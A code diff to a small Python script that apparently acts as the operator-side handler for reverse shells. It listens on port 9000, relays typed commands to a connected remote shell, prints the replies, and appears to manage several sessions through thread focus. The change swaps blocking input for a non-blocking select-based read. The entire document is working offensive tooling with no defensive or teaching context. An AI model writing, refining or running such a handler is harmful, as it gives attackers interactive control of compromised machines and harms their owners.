@@ -1,9 +1,16 @@
 import socket
 import time
 import threading
+import sys
+import select
 
 thread_stdin_lock = threading.Lock()
 thread_stdin_target = 0
+
+def non_blocking_input(timeout=0.1):
+    if select.select([sys.stdin], [], [], timeout)[0]:
+        return sys.stdin.readline().strip()
+    return None
 
 def reverse_shell_connection(ip: str, port: int, id: int):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,11 +29,12 @@ def reverse_shell_connection(ip: str, port: int, id: int):
             in_focus = thread_stdin_target == id
 
         if in_focus:
-            cmd = input()
-            conn.send(cmd.encode() + b"\n")
-            time.sleep(0.5)
-            output = conn.recv(1024).decode()
-            print(output, end="")
+            cmd = non_blocking_input()
+            if cmd is not None:
+                conn.send(cmd.encode() + b"\n")
+                time.sleep(0.5)
+                output = conn.recv(1024).decode()
+                print(output, end="")
 
 t = threading.Thread(target=reverse_shell_connection, args=('0.0.0.0', 9000, 1))
 t.start()
